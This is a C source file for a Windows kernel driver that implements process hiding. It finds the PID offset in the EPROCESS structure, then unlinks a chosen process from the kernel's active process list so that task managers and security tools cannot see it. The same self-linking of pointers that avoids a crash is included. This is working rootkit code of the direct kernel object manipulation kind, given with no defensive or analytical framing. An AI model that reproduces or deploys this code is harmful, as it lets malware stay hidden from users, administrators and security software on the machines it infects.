#include "Driver.h"

PCHAR hidep(UINT32 pid) {

	ULONG PID_OFFSET = find_eproc_pid();

	ULONG LIST_OFFSET = PID_OFFSET;

	LIST_OFFSET += sizeof(INT_PTR);

	PEPROCESS currentProcess = PsGetCurrentProcess();

	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
	

	// Record the starting position
	PEPROCESS StartProcess = currentProcess;

	// Move to next item
	currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
	currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);


	// Loop until we find the right process to remove
	// Or until we circle back
	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentProcess) {

		// Check item
		if (*(UINT32*)CurrentPID == pid) {
		
			PLIST_ENTRY prev = currentList->Blink;
			PLIST_ENTRY next = currentList->Flink;

			prev->Flink = next;
			next->Blink = prev;

			// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
			currentList->Blink = (PLIST_ENTRY)&currentList->Flink;
			currentList->Flink = (PLIST_ENTRY)&currentList->Flink;

			break;
		}

		// Move to next item
		currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
		currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
	}

	return NULL;
}



ULONG find_eproc_pid() {

	ULONG pid_ofs = 0;					// The offset we're looking for
	int idx = 0;						// Index 
	ULONG pids[PROCAMOUNT] = { 0 };		// List of PIDs for our 3 processes
	PEPROCESS eprocs[PROCAMOUNT];		// Process list, will contain 3 processes

	// Select 3 process PIDs and get their EPROCESS Pointer
	for (int i = 16; idx < PROCAMOUNT; i += 4) {
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx]))) {
			pids[idx++] = i;
		}
	}

	for (int i = 0x20; i < 0x300; i += 4) {
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i; break;
		}
	}

	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);


	return pid_ofs;
}